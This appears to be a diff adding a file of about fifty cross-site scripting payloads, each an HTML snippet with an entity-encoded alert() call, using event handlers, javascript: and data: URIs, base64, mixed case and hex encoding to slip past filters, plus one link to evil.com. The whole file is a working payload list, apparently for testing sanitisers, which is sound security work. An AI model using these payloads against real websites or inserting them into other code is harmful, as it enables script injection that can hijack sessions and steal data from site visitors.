@@ -1,0 +1,50 @@
+<a href="javascript:&#97;&#108;&#101;&#114;&#116;('XSS')">Click me</a>
+<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;('XSS1')">
+<svg onload="&#97;&#108;&#101;&#114;&#116;('XSS2')"></svg>
+<iframe srcdoc="&lt;script&gt;&#97;&#108;&#101;&#114;&#116;('XSS3')&lt;/script&gt;"></iframe>
+<body onload="&#97;&#108;&#101;&#114;&#116;('XSS4')">
+<svg><script href="data:text/javascript,&#97;&#108;&#101;&#114;&#116;('XSS5')"></script></svg>
+<math href="javascript:&#97;&#108;&#101;&#114;&#116;('XSS6')">+</math>
+<details open ontoggle="&#97;&#108;&#101;&#114;&#116;('XSS7')"></details>
+<object data="javascript:&#97;&#108;&#101;&#114;&#116;('XSS8')"></object>
+<embed src="javascript:&#97;&#108;&#101;&#114;&#116;('XSS9')">
+<svg/onload=&#97;&#108;&#101;&#114;&#116;`XSS10`>
+<img src=x: onerror=&#97;&#108;&#101;&#114;&#116;`XSS11`>
+<input value="X" autofocus onfocus=&#97;&#108;&#101;&#114;&#116;`XSS12`>
+<marquee onstart=&#97;&#108;&#101;&#114;&#116;`XSS13`></marquee>
+<keygen autofocus onfocus=&#97;&#108;&#101;&#114;&#116;`XSS14`>
+<select autofocus onfocus=&#97;&#108;&#101;&#114;&#116;`XSS15`></select>
+<video src=x onerror=&#97;&#108;&#101;&#114;&#116;`XSS16`></video>
+<audio src=x onerror=&#97;&#108;&#101;&#114;&#116;`XSS17`></audio>
+<a draggable="true" ondragstart=&#97;&#108;&#101;&#114;&#116;`XSS18`>Drag</a>
+<div onmouseover=&#97;&#108;&#101;&#114;&#116;`XSS19`>Hover me</div>
+<textarea onfocus=&#97;&#108;&#101;&#114;&#116;`XSS20` autofocus></textarea>
+<svg><a xlink:href="javascript:&#97;&#108;&#101;&#114;&#116;('XSS21')">Run</a></svg>
+<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoJ1hTUzIyJyk+"></img>
+<form><button formaction="javascript:&#97;&#108;&#101;&#114;&#116;('XSS23')">Submit</button></form>
+<script src="data:text/javascript,&#97;&#108;&#101;&#114;&#116;('XSS24')"></script>
+<div style="background:url(javascript:&#97;&#108;&#101;&#114;&#116;('XSS25'))"></div>
+<object type="text/x-scriptlet" data="data:text/html,&lt;script&gt;&#97;&#108;&#101;&#114;&#116;('XSS26')&lt;/script&gt;"></object>
+<meta http-equiv="refresh" content="0;url=javascript:&#97;&#108;&#101;&#114;&#116;('XSS27')">
+<a href="data:text/html,&lt;script&gt;&#97;&#108;&#101;&#114;&#116;('XSS28')&lt;/script&gt;">dataURI</a>
+<input type=image src=x onerror=&#97;&#108;&#101;&#114;&#116;`XSS29`>
+<isindex action="javascript:&#97;&#108;&#101;&#114;&#116;('XSS30')">
+<frame src="javascript:&#97;&#108;&#101;&#114;&#116;('XSS31')"></frame>
+<link rel=stylesheet href="javascript:&#97;&#108;&#101;&#114;&#116;('XSS32')">
+<table background="javascript:&#97;&#108;&#101;&#114;&#116;('XSS33')"></table>
+<body background="javascript:&#97;&#108;&#101;&#114;&#116;('XSS34')">
+<applet code="javascript:&#97;&#108;&#101;&#114;&#116;('XSS35')"></applet>
+<meta charset="x-imap4-url;url=javascript:&#97;&#108;&#101;&#114;&#116;('XSS36')">
+<a href="JaVaScRiPt:&#97;&#108;&#101;&#114;&#116;('XSS37')">Mixed case</a>
+<a href="jav&#x61;script:&#97;&#108;&#101;&#114;&#116;('XSS38')">Hex</a>
+<a href="javascript:eval(&#x61;&#x6C;&#x65;&#x72;&#x74;('XSS39'))">Eval</a>
+<button onclick="&#97;&#108;&#101;&#114;&#116;('XSS40')">Click</button>
+<iframe onload=&#97;&#108;&#101;&#114;&#116;`XSS41`></iframe>
+<svg><foreignObject onload=&#97;&#108;&#101;&#114;&#116;`XSS42`></foreignObject></svg>
+<svg><set attributeName="onload" to="&#97;&#108;&#101;&#114;&#116;('XSS43')"></set></svg>
+<div style="width:expression(&#97;&#108;&#101;&#114;&#116;('XSS44'))">EXP</div>
+<meta http-equiv="set-cookie" content="xss=&#97;&#108;&#101;&#114;&#116;('XSS45')">
+<input type="text" onkeydown=&#97;&#108;&#101;&#114;&#116;`XSS46` autofocus>
+<a href="//evil.com/%0Ajavascript:&#97;&#108;&#101;&#114;&#116;('XSS47')">URL encoded</a>
+<svg><script>&#97;&#108;&#101;&#114;&#116;('XSS48')</script></svg>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNDknKTwvc2NyaXB0Pg==">Base64</a>
